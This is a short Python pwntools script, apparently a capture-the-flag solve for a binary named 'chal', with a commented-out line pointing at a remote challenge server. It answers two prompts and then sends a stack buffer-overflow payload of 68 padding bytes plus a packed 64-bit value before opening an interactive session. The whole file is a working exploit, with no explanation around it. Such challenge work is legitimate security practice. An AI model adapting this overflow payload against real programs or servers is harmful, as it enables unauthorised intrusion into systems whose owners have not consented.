#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

p = process("./chal")
# p = remote("34.70.212.151", 8004)

p.recv()
p.sendline(b"123")
p.recv()
p.sendline(b"whoami")
p.recv()
pay = b"a" * 68 + p64(100)
p.sendline(pay)
p.interactive()
p.close()
